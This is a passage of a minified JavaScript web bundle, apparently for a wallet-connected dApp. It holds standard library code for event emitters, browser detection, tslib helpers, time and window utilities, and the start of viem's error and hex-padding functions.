var G7=Object.defineProperty;var nv=t=>{throw TypeError(t)};var K7=(t,e,r)=>e in t?G7(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r;var j=(t,e,r)=>K7(t,typeof e!="symbol"?e+"":e,r),T1=(t,e,r)=>e.has(t)||nv("Cannot "+r);var A=(t,e,r)=>(T1(t,e,"read from private field"),r?r.call(t):e.get(t)),H=(t,e,r)=>e.has(t)?nv("Cannot add the same private member more than once"):e instanceof WeakSet?e.add(t):e.set(t,r),$=(t,e,r,n)=>(T1(t,e,"write to private field"),n?n.call(t,r):e.set(t,r),r),Q=(t,e,r)=>(T1(t,e,"access private method"),r);var mh=(t,e,r,n)=>({set _(i){$(t,e,i,r)},get _(){return A(t,e,n)}});(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))n(i);new MutationObserver(i=>{for(const s of i)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&n(o)}).observe(document,{childList:!0,subtree:!0});function r(i){const s={};return i.integrity&&(s.integrity=i.integrity),i.referrerPolicy&&(s.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?s.credentials="include":i.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function n(i){if(i.ep)return;i.ep=!0;const s=r(i);fetch(i.href,s)}})();var Mi=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function _b(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}function Z7(t){if(Object.prototype.hasOwnProperty.call(t,"__esModule"))return t;var e=t.default;if(typeof e=="function"){var r=function n(){return this instanceof n?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};r.prototype=e.prototype}else r={};return Object.defineProperty(r,"__esModule",{value:!0}),Object.keys(t).forEach(function(n){var i=Object.getOwnPropertyDescriptor(t,n);Object.defineProperty(r,n,i.get?i:{enumerable:!0,get:function(){return t[n]}})}),r}var dp={exports:{}},iv;function J7(){if(iv)return dp.exports;iv=1;var t=typeof Reflect=="object"?Reflect:null,e=t&&typeof t.apply=="function"?t.apply:function(I,C,N){return Function.prototype.apply.call(I,C,N)},r;t&&typeof t.ownKeys=="function"?r=t.ownKeys:Object.getOwnPropertySymbols?r=function(I){return Object.getOwnPropertyNames(I).concat(Object.getOwnPropertySymbols(I))}:r=function(I){return Object.getOwnPropertyNames(I)};function n(x){console&&console.warn&&console.warn(x)}var i=Number.isNaN||function(I){return I!==I};function s(){s.init.call(this)}dp.exports=s,dp.exports.once=m,s.EventEmitter=s,s.prototype._events=void 0,s.prototype._eventsCount=0,s.prototype._maxListeners=void 0;var o=10;function a(x){if(typeof x!="function")throw new TypeError('The "listener" argument must be of type Function. Received type '+typeof x)}Object.defineProperty(s,"defaultMaxListeners",{enumerable:!0,get:function(){return o},set:function(x){if(typeof x!="number"||x<0||i(x))throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received '+x+".");o=x}}),s.init=function(){(this._events===void 0||this._events===Object.getPrototypeOf(this)._events)&&(this._events=Object.create(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0},s.prototype.setMaxListeners=function(I){if(typeof I!="number"||I<0||i(I))throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received '+I+".");return this._maxListeners=I,this};function c(x){return x._maxListeners===void 0?s.defaultMaxListeners:x._maxListeners}s.prototype.getMaxListeners=function(){return c(this)},s.prototype.emit=function(I){for(var C=[],N=1;N<arguments.length;N++)C.push(arguments[N]);var S=I==="error",P=this._events;if(P!==void 0)S=S&&P.error===void 0;else if(!S)return!1;if(S){var T;if(C.length>0&&(T=C[0]),T instanceof Error)throw T;var D=new Error("Unhandled error."+(T?" ("+T.message+")":""));throw D.context=T,D}var z=P[I];if(z===void 0)return!1;if(typeof z=="function")e(z,this,C);else for(var V=z.length,O=g(z,V),N=0;N<V;++N)e(O[N],this,C);return!0};function l(x,I,C,N){var S,P,T;if(a(C),P=x._events,P===void 0?(P=x._events=Object.create(null),x._eventsCount=0):(P.newListener!==void 0&&(x.emit("newListener",I,C.listener?C.listener:C),P=x._events),T=P[I]),T===void 0)T=P[I]=C,++x._eventsCount;else if(typeof T=="function"?T=P[I]=N?[C,T]:[T,C]:N?T.unshift(C):T.push(C),S=c(x),S>0&&T.length>S&&!T.warned){T.warned=!0;var D=new Error("Possible EventEmitter memory leak detected. "+T.length+" "+String(I)+" listeners added. Use emitter.setMaxListeners() to increase limit");D.name="MaxListenersExceededWarning",D.emitter=x,D.type=I,D.count=T.length,n(D)}return x}s.prototype.addListener=function(I,C){return l(this,I,C,!1)},s.prototype.on=s.prototype.addListener,s.prototype.prependListener=function(I,C){return l(this,I,C,!0)};function u(){if(!this.fired)return this.target.removeListener(this.type,this.wrapFn),this.fired=!0,arguments.length===0?this.listener.call(this.target):this.listener.apply(this.target,arguments)}function h(x,I,C){var N={fired:!1,wrapFn:void 0,target:x,type:I,listener:C},S=u.bind(N);return S.listener=C,N.wrapFn=S,S}s.prototype.once=function(I,C){return a(C),this.on(I,h(this,I,C)),this},s.prototype.prependOnceListener=function(I,C){return a(C),this.prependListener(I,h(this,I,C)),this},s.prototype.removeListener=function(I,C){var N,S,P,T,D;if(a(C),S=this._events,S===void 0)return this;if(N=S[I],N===void 0)return this;if(N===C||N.listener===C)--this._eventsCount===0?this._events=Object.create(null):(delete S[I],S.removeListener&&this.emit("removeListener",I,N.listener||C));else if(typeof N!="function"){for(P=-1,T=N.length-1;T>=0;T--)if(N[T]===C||N[T].listener===C){D=N[T].listener,P=T;break}if(P<0)return this;P===0?N.shift():p(N,P),N.length===1&&(S[I]=N[0]),S.removeListener!==void 0&&this.emit("removeListener",I,D||C)}return this},s.prototype.off=s.prototype.removeListener,s.prototype.removeAllListeners=function(I){var C,N,S;if(N=this._events,N===void 0)return this;if(N.removeListener===void 0)return arguments.length===0?(this._events=Object.create(null),this._eventsCount=0):N[I]!==void 0&&(--this._eventsCount===0?this._events=Object.create(null):delete N[I]),this;if(arguments.length===0){var P=Object.keys(N),T;for(S=0;S<P.length;++S)T=P[S],T!=="removeListener"&&this.removeAllListeners(T);return this.removeAllListeners("removeListener"),this._events=Object.create(null),this._eventsCount=0,this}if(C=N[I],typeof C=="function")this.removeListener(I,C);else if(C!==void 0)for(S=C.length-1;S>=0;S--)this.removeListener(I,C[S]);return this};function d(x,I,C){var N=x._events;if(N===void 0)return[];var S=N[I];return S===void 0?[]:typeof S=="function"?C?[S.listener||S]:[S]:C?w(S):g(S,S.length)}s.prototype.listeners=function(I){return d(this,I,!0)},s.prototype.rawListeners=function(I){return d(this,I,!1)},s.listenerCount=function(x,I){return typeof x.listenerCount=="function"?x.listenerCount(I):f.call(x,I)},s.prototype.listenerCount=f;function f(x){var I=this._events;if(I!==void 0){var C=I[x];if(typeof C=="function")return 1;if(C!==void 0)return C.length}return 0}s.prototype.eventNames=function(){return this._eventsCount>0?r(this._events):[]};function g(x,I){for(var C=new Array(I),N=0;N<I;++N)C[N]=x[N];return C}function p(x,I){for(;I+1<x.length;I++)x[I]=x[I+1];x.pop()}function w(x){for(var I=new Array(x.length),C=0;C<I.length;++C)I[C]=x[C].listener||x[C];return I}function m(x,I){return new Promise(function(C,N){function S(T){x.removeListener(I,P),N(T)}function P(){typeof x.removeListener=="function"&&x.removeListener("error",S),C([].slice.call(arguments))}v(x,I,P,{once:!0}),I!=="error"&&b(x,S,{once:!0})})}function b(x,I,C){typeof x.on=="function"&&v(x,"error",I,C)}function v(x,I,C,N){if(typeof x.on=="function")N.once?x.once(I,C):x.on(I,C);else if(typeof x.addEventListener=="function")x.addEventListener(I,function S(P){N.once&&x.removeEventListener(I,S),C(P)});else throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type '+typeof x)}return dp.exports}var mn=J7();const Tb=_b(mn);var sv=function(t,e,r){if(r||arguments.length===2)for(var n=0,i=e.length,s;n<i;n++)(s||!(n in e))&&(s||(s=Array.prototype.slice.call(e,0,n)),s[n]=e[n]);return t.concat(s||Array.prototype.slice.call(e))},Q7=function(){function t(e,r,n){this.name=e,this.version=r,this.os=n,this.type="browser"}return t}(),Y7=function(){function t(e){this.version=e,this.type="node",this.name="node",this.os=process.platform}return t}(),X7=function(){function t(e,r,n,i){this.name=e,this.version=r,this.os=n,this.bot=i,this.type="bot-device"}return t}(),eI=function(){function t(){this.type="bot",this.bot=!0,this.name="bot",this.version=null,this.os=null}return t}(),tI=function(){function t(){this.type="react-native",this.name="react-native",this.version=null,this.os=null}return t}(),rI=/alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/,nI=/(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/,ov=3,iI=[["aol",/AOLShield\/([0-9\._]+)/],["edge",/Edge\/([0-9\._]+)/],["edge-ios",/EdgiOS\/([0-9\._]+)/],["yandexbrowser",/YaBrowser\/([0-9\._]+)/],["kakaotalk",/KAKAOTALK\s([0-9\.]+)/],["samsung",/SamsungBrowser\/([0-9\.]+)/],["silk",/\bSilk\/([0-9._-]+)\b/],["miui",/MiuiBrowser\/([0-9\.]+)$/],["beaker",/BeakerBrowser\/([0-9\.]+)/],["edge-chromium",/EdgA?\/([0-9\.]+)/],["chromium-webview",/(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["chrome",/(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["phantomjs",/PhantomJS\/([0-9\.]+)(:?\s|$)/],["crios",/CriOS\/([0-9\.]+)(:?\s|$)/],["firefox",/Firefox\/([0-9\.]+)(?:\s|$)/],["fxios",/FxiOS\/([0-9\.]+)/],["opera-mini",/Opera Mini.*Version\/([0-9\.]+)/],["opera",/Opera\/([0-9\.]+)(?:\s|$)/],["opera",/OPR\/([0-9\.]+)(:?\s|$)/],["pie",/^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/],["pie",/^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/],["netfront",/^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/],["ie",/Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/],["ie",/MSIE\s([0-9\.]+);.*Trident\/[4-7].0/],["ie",/MSIE\s(7\.0)/],["bb10",/BB10;\sTouch.*Version\/([0-9\.]+)/],["android",/Android\s([0-9\.]+)/],["ios",/Version\/([0-9\._]+).*Mobile.*Safari.*/],["safari",/Version\/([0-9\._]+).*Safari/],["facebook",/FB[AS]V\/([0-9\.]+)/],["instagram",/Instagram\s([0-9\.]+)/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Mobile/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Gecko\)$/],["curl",/^curl\/([0-9\.]+)$/],["searchbot",rI]],av=[["iOS",/iP(hone|od|ad)/],["Android OS",/Android/],["BlackBerry OS",/BlackBerry|BB10/],["Windows Mobile",/IEMobile/],["Amazon OS",/Kindle/],["Windows 3.11",/Win16/],["Windows 95",/(Windows 95)|(Win95)|(Windows_95)/],["Windows 98",/(Windows 98)|(Win98)/],["Windows 2000",/(Windows NT 5.0)|(Windows 2000)/],["Windows XP",/(Windows NT 5.1)|(Windows XP)/],["Windows Server 2003",/(Windows NT 5.2)/],["Windows Vista",/(Windows NT 6.0)/],["Windows 7",/(Windows NT 6.1)/],["Windows 8",/(Windows NT 6.2)/],["Windows 8.1",/(Windows NT 6.3)/],["Windows 10",/(Windows NT 10.0)/],["Windows ME",/Windows ME/],["Windows CE",/Windows CE|WinCE|Microsoft Pocket Internet Explorer/],["Open BSD",/OpenBSD/],["Sun OS",/SunOS/],["Chrome OS",/CrOS/],["Linux",/(Linux)|(X11)/],["Mac OS",/(Mac_PowerPC)|(Macintosh)/],["QNX",/QNX/],["BeOS",/BeOS/],["OS/2",/OS\/2/]];function sI(t){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"?new tI:typeof navigator<"u"?aI(navigator.userAgent):lI()}function oI(t){return t!==""&&iI.reduce(function(e,r){var n=r[0],i=r[1];if(e)return e;var s=i.exec(t);return!!s&&[n,s]},!1)}function aI(t){var e=oI(t);if(!e)return null;var r=e[0],n=e[1];if(r==="searchbot")return new eI;var i=n[1]&&n[1].split(".").join("_").split("_").slice(0,3);i?i.length<ov&&(i=sv(sv([],i,!0),uI(ov-i.length),!0)):i=[];var s=i.join("."),o=cI(t),a=nI.exec(t);return a&&a[1]?new X7(r,s,o,a[1]):new Q7(r,s,o)}function cI(t){for(var e=0,r=av.length;e<r;e++){var n=av[e],i=n[0],s=n[1],o=s.exec(t);if(o)return i}return null}function lI(){var t=typeof process<"u"&&process.version;return t?new Y7(process.version.slice(1)):null}function uI(t){for(var e=[],r=0;r<t;r++)e.push("0");return e}var $1={};/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */var Um=function(t,e){return Um=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(r,n){r.__proto__=n}||function(r,n){for(var i in n)n.hasOwnProperty(i)&&(r[i]=n[i])},Um(t,e)};function hI(t,e){Um(t,e);function r(){this.constructor=t}t.prototype=e===null?Object.create(e):(r.prototype=e.prototype,new r)}var Mm=function(){return Mm=Object.assign||function(e){for(var r,n=1,i=arguments.length;n<i;n++){r=arguments[n];for(var s in r)Object.prototype.hasOwnProperty.call(r,s)&&(e[s]=r[s])}return e},Mm.apply(this,arguments)};function dI(t,e){var r={};for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&e.indexOf(n)<0&&(r[n]=t[n]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,n=Object.getOwnPropertySymbols(t);i<n.length;i++)e.indexOf(n[i])<0&&Object.prototype.propertyIsEnumerable.call(t,n[i])&&(r[n[i]]=t[n[i]]);return r}function fI(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s}function pI(t,e){return function(r,n){e(r,n,t)}}function gI(t,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(t,e)}function wI(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(u){try{l(n.next(u))}catch(h){o(h)}}function c(u){try{l(n.throw(u))}catch(h){o(h)}}function l(u){u.done?s(u.value):i(u.value).then(a,c)}l((n=n.apply(t,e||[])).next())})}function mI(t,e){var r={label:0,sent:function(){if(s[0]&1)throw s[1];return s[1]},trys:[],ops:[]},n,i,s,o;return o={next:a(0),throw:a(1),return:a(2)},typeof Symbol=="function"&&(o[Symbol.iterator]=function(){return this}),o;function a(l){return function(u){return c([l,u])}}function c(l){if(n)throw new TypeError("Generator is already executing.");for(;r;)try{if(n=1,i&&(s=l[0]&2?i.return:l[0]?i.throw||((s=i.return)&&s.call(i),0):i.next)&&!(s=s.call(i,l[1])).done)return s;switch(i=0,s&&(l=[l[0]&2,s.value]),l[0]){case 0:case 1:s=l;break;case 4:return r.label++,{value:l[1],done:!1};case 5:r.label++,i=l[1],l=[0];continue;case 7:l=r.ops.pop(),r.trys.pop();continue;default:if(s=r.trys,!(s=s.length>0&&s[s.length-1])&&(l[0]===6||l[0]===2)){r=0;continue}if(l[0]===3&&(!s||l[1]>s[0]&&l[1]<s[3])){r.label=l[1];break}if(l[0]===6&&r.label<s[1]){r.label=s[1],s=l;break}if(s&&r.label<s[2]){r.label=s[2],r.ops.push(l);break}s[2]&&r.ops.pop(),r.trys.pop();continue}l=e.call(t,r)}catch(u){l=[6,u],i=0}finally{n=s=0}if(l[0]&5)throw l[1];return{value:l[0]?l[1]:void 0,done:!0}}}function yI(t,e,r,n){n===void 0&&(n=r),t[n]=e[r]}function bI(t,e){for(var r in t)r!=="default"&&!e.hasOwnProperty(r)&&(e[r]=t[r])}function Fm(t){var e=typeof Symbol=="function"&&Symbol.iterator,r=e&&t[e],n=0;if(r)return r.call(t);if(t&&typeof t.length=="number")return{next:function(){return t&&n>=t.length&&(t=void 0),{value:t&&t[n++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function Z6(t,e){var r=typeof Symbol=="function"&&t[Symbol.iterator];if(!r)return t;var n=r.call(t),i,s=[],o;try{for(;(e===void 0||e-- >0)&&!(i=n.next()).done;)s.push(i.value)}catch(a){o={error:a}}finally{try{i&&!i.done&&(r=n.return)&&r.call(n)}finally{if(o)throw o.error}}return s}function vI(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(Z6(arguments[e]));return t}function EI(){for(var t=0,e=0,r=arguments.length;e<r;e++)t+=arguments[e].length;for(var n=Array(t),i=0,e=0;e<r;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,i++)n[i]=s[o];return n}function Td(t){return this instanceof Td?(this.v=t,this):new Td(t)}function CI(t,e,r){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var n=r.apply(t,e||[]),i,s=[];return i={},o("next"),o("throw"),o("return"),i[Symbol.asyncIterator]=function(){return this},i;function o(d){n[d]&&(i[d]=function(f){return new Promise(function(g,p){s.push([d,f,g,p])>1||a(d,f)})})}function a(d,f){try{c(n[d](f))}catch(g){h(s[0][3],g)}}function c(d){d.value instanceof Td?Promise.resolve(d.value.v).then(l,u):h(s[0][2],d)}function l(d){a("next",d)}function u(d){a("throw",d)}function h(d,f){d(f),s.shift(),s.length&&a(s[0][0],s[0][1])}}function AI(t){var e,r;return e={},n("next"),n("throw",function(i){throw i}),n("return"),e[Symbol.iterator]=function(){return this},e;function n(i,s){e[i]=t[i]?function(o){return(r=!r)?{value:Td(t[i](o)),done:i==="return"}:s?s(o):o}:s}}function xI(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],r;return e?e.call(t):(t=typeof Fm=="function"?Fm(t):t[Symbol.iterator](),r={},n("next"),n("throw"),n("return"),r[Symbol.asyncIterator]=function(){return this},r);function n(s){r[s]=t[s]&&function(o){return new Promise(function(a,c){o=t[s](o),i(a,c,o.done,o.value)})}}function i(s,o,a,c){Promise.resolve(c).then(function(l){s({value:l,done:a})},o)}}function II(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t}function SI(t){if(t&&t.__esModule)return t;var e={};if(t!=null)for(var r in t)Object.hasOwnProperty.call(t,r)&&(e[r]=t[r]);return e.default=t,e}function NI(t){return t&&t.__esModule?t:{default:t}}function PI(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)}function kI(t,e,r){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,r),r}const OI=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return Mm},__asyncDelegator:AI,__asyncGenerator:CI,__asyncValues:xI,__await:Td,__awaiter:wI,__classPrivateFieldGet:PI,__classPrivateFieldSet:kI,__createBinding:yI,__decorate:fI,__exportStar:bI,__extends:hI,__generator:mI,__importDefault:NI,__importStar:SI,__makeTemplateObject:II,__metadata:gI,__param:pI,__read:Z6,__rest:dI,__spread:vI,__spreadArrays:EI,__values:Fm},Symbol.toStringTag,{value:"Module"})),Lf=Z7(OI);var R1={},yh={},cv;function _I(){if(cv)return yh;cv=1,Object.defineProperty(yh,"__esModule",{value:!0}),yh.delay=void 0;function t(e){return new Promise(r=>{setTimeout(()=>{r(!0)},e)})}return yh.delay=t,yh}var Jo={},D1={},Qo={},lv;function TI(){return lv||(lv=1,Object.defineProperty(Qo,"__esModule",{value:!0}),Qo.ONE_THOUSAND=Qo.ONE_HUNDRED=void 0,Qo.ONE_HUNDRED=100,Qo.ONE_THOUSAND=1e3),Qo}var B1={},uv;function $I(){return uv||(uv=1,function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.ONE_YEAR=t.FOUR_WEEKS=t.THREE_WEEKS=t.TWO_WEEKS=t.ONE_WEEK=t.THIRTY_DAYS=t.SEVEN_DAYS=t.FIVE_DAYS=t.THREE_DAYS=t.ONE_DAY=t.TWENTY_FOUR_HOURS=t.TWELVE_HOURS=t.SIX_HOURS=t.THREE_HOURS=t.ONE_HOUR=t.SIXTY_MINUTES=t.THIRTY_MINUTES=t.TEN_MINUTES=t.FIVE_MINUTES=t.ONE_MINUTE=t.SIXTY_SECONDS=t.THIRTY_SECONDS=t.TEN_SECONDS=t.FIVE_SECONDS=t.ONE_SECOND=void 0,t.ONE_SECOND=1,t.FIVE_SECONDS=5,t.TEN_SECONDS=10,t.THIRTY_SECONDS=30,t.SIXTY_SECONDS=60,t.ONE_MINUTE=t.SIXTY_SECONDS,t.FIVE_MINUTES=t.ONE_MINUTE*5,t.TEN_MINUTES=t.ONE_MINUTE*10,t.THIRTY_MINUTES=t.ONE_MINUTE*30,t.SIXTY_MINUTES=t.ONE_MINUTE*60,t.ONE_HOUR=t.SIXTY_MINUTES,t.THREE_HOURS=t.ONE_HOUR*3,t.SIX_HOURS=t.ONE_HOUR*6,t.TWELVE_HOURS=t.ONE_HOUR*12,t.TWENTY_FOUR_HOURS=t.ONE_HOUR*24,t.ONE_DAY=t.TWENTY_FOUR_HOURS,t.THREE_DAYS=t.ONE_DAY*3,t.FIVE_DAYS=t.ONE_DAY*5,t.SEVEN_DAYS=t.ONE_DAY*7,t.THIRTY_DAYS=t.ONE_DAY*30,t.ONE_WEEK=t.SEVEN_DAYS,t.TWO_WEEKS=t.ONE_WEEK*2,t.THREE_WEEKS=t.ONE_WEEK*3,t.FOUR_WEEKS=t.ONE_WEEK*4,t.ONE_YEAR=t.ONE_DAY*365}(B1)),B1}var hv;function J6(){return hv||(hv=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=Lf;e.__exportStar(TI(),t),e.__exportStar($I(),t)}(D1)),D1}var dv;function RI(){if(dv)return Jo;dv=1,Object.defineProperty(Jo,"__esModule",{value:!0}),Jo.fromMiliseconds=Jo.toMiliseconds=void 0;const t=J6();function e(n){return n*t.ONE_THOUSAND}Jo.toMiliseconds=e;function r(n){return Math.floor(n/t.ONE_THOUSAND)}return Jo.fromMiliseconds=r,Jo}var fv;function DI(){return fv||(fv=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=Lf;e.__exportStar(_I(),t),e.__exportStar(RI(),t)}(R1)),R1}var zc={},pv;function BI(){if(pv)return zc;pv=1,Object.defineProperty(zc,"__esModule",{value:!0}),zc.Watch=void 0;class t{constructor(){this.timestamps=new Map}start(r){if(this.timestamps.has(r))throw new Error(`Watch already started for label: ${r}`);this.timestamps.set(r,{started:Date.now()})}stop(r){const n=this.get(r);if(typeof n.elapsed<"u")throw new Error(`Watch already stopped for label: ${r}`);const i=Date.now()-n.started;this.timestamps.set(r,{started:n.started,elapsed:i})}get(r){const n=this.timestamps.get(r);if(typeof n>"u")throw new Error(`No timestamp found for label: ${r}`);return n}elapsed(r){const n=this.get(r);return n.elapsed||Date.now()-n.started}}return zc.Watch=t,zc.default=t,zc}var L1={},bh={},gv;function LI(){if(gv)return bh;gv=1,Object.defineProperty(bh,"__esModule",{value:!0}),bh.IWatch=void 0;class t{}return bh.IWatch=t,bh}var wv;function UI(){return wv||(wv=1,function(t){Object.defineProperty(t,"__esModule",{value:!0}),Lf.__exportStar(LI(),t)}(L1)),L1}var mv;function MI(){return mv||(mv=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=Lf;e.__exportStar(DI(),t),e.__exportStar(BI(),t),e.__exportStar(UI(),t),e.__exportStar(J6(),t)}($1)),$1}var X=MI(),at={},yv;function Q6(){if(yv)return at;yv=1,Object.defineProperty(at,"__esModule",{value:!0}),at.getLocalStorage=at.getLocalStorageOrThrow=at.getCrypto=at.getCryptoOrThrow=at.getLocation=at.getLocationOrThrow=at.getNavigator=at.getNavigatorOrThrow=at.getDocument=at.getDocumentOrThrow=at.getFromWindowOrThrow=at.getFromWindow=void 0;function t(d){let f;return typeof window<"u"&&typeof window[d]<"u"&&(f=window[d]),f}at.getFromWindow=t;function e(d){const f=t(d);if(!f)throw new Error(`${d} is not defined in Window`);return f}at.getFromWindowOrThrow=e;function r(){return e("document")}at.getDocumentOrThrow=r;function n(){return t("document")}at.getDocument=n;function i(){return e("navigator")}at.getNavigatorOrThrow=i;function s(){return t("navigator")}at.getNavigator=s;function o(){return e("location")}at.getLocationOrThrow=o;function a(){return t("location")}at.getLocation=a;function c(){return e("crypto")}at.getCryptoOrThrow=c;function l(){return t("crypto")}at.getCrypto=l;function u(){return e("localStorage")}at.getLocalStorageOrThrow=u;function h(){return t("localStorage")}return at.getLocalStorage=h,at}var wc=Q6(),vh={},bv;function FI(){if(bv)return vh;bv=1,Object.defineProperty(vh,"__esModule",{value:!0}),vh.getWindowMetadata=void 0;const t=Q6();function e(){let r,n;try{r=t.getDocumentOrThrow(),n=t.getLocationOrThrow()}catch{return null}function i(){const f=r.getElementsByTagName("link"),g=[];for(let p=0;p<f.length;p++){const w=f[p],m=w.getAttribute("rel");if(m&&m.toLowerCase().indexOf("icon")>-1){const b=w.getAttribute("href");if(b)if(b.toLowerCase().indexOf("https:")===-1&&b.toLowerCase().indexOf("http:")===-1&&b.indexOf("//")!==0){let v=n.protocol+"//"+n.host;if(b.indexOf("/")===0)v+=b;else{const x=n.pathname.split("/");x.pop();const I=x.join("/");v+=I+"/"+b}g.push(v)}else if(b.indexOf("//")===0){const v=n.protocol+b;g.push(v)}else g.push(b)}}return g}function s(...f){const g=r.getElementsByTagName("meta");for(let p=0;p<g.length;p++){const w=g[p],m=["itemprop","property","name"].map(b=>w.getAttribute(b)).filter(b=>b?f.includes(b):!1);if(m.length&&m){const b=w.getAttribute("content");if(b)return b}}return""}function o(){let f=s("name","og:site_name","og:title","twitter:title");return f||(f=r.title),f}function a(){return s("description","og:description","twitter:description","keywords")}const c=o(),l=a(),u=n.origin,h=i();return{description:l,url:u,icons:h,name:c}}return vh.getWindowMetadata=e,vh}var zI=FI();function $d(t,{strict:e=!0}={}){return!t||typeof t!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(t):t.startsWith("0x")}function vv(t){return $d(t,{strict:!1})?Math.ceil((t.length-2)/2):t.length}const Y6="2.23.2";let Eh={getDocsUrl:({docsBaseUrl:t,docsPath:e="",docsSlug:r})=>e?`${t??"https://viem.sh"}${e}${r?`#${r}`:""}`:void 0,version:`viem@${Y6}`};class mc extends Error{constructor(e,r={}){var a;const n=(()=>{var c;return r.cause instanceof mc?r.cause.details:(c=r.cause)!=null&&c.message?r.cause.message:r.details})(),i=r.cause instanceof mc&&r.cause.docsPath||r.docsPath,s=(a=Eh.getDocsUrl)==null?void 0:a.call(Eh,{...r,docsPath:i}),o=[e||"An error occurred.","",...r.metaMessages?[...r.metaMessages,""]:[],...s?[`Docs: ${s}`]:[],...n?[`Details: ${n}`]:[],...Eh.version?[`Version: ${Eh.version}`]:[]].join(`
`);super(o,r.cause?{cause:r.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=n,this.docsPath=i,this.metaMessages=r.metaMessages,this.name=r.name??this.name,this.shortMessage=e,this.version=Y6}walk(e){return X6(this,e)}}function X6(t,e){return e!=null&&e(t)?t:t&&typeof t=="object"&&"cause"in t&&t.cause!==void 0?X6(t.cause,e):e?null:t}class eE extends mc{constructor({size:e,targetSize:r,type:n}){super(`${n.charAt(0).toUpperCase()}${n.slice(1).toLowerCase()} size (${e}) exceeds padding size (${r}).`,{name:"SizeExceedsPaddingSizeError"})}}function oh(t,{dir:e,size:r=32}={}){return typeof t=="string"?jI(t,{dir:e,size:r}):HI(t,{dir:e,size:r})}function jI(t,{dir:e,size:r=32}={}){if(r===null)return t;const n=t.replace("0x","");if(n.length>r*2)throw new eE({size:Math.ceil(n.length/2),targetSize:r,type:"hex"});return`0x${n[e==="right"?"padEnd":"padStart"](r*2,"0")}`}function HI(t,{dir:e,size:r=32}={}){if(r===null)return t;if(t.length>r)throw new 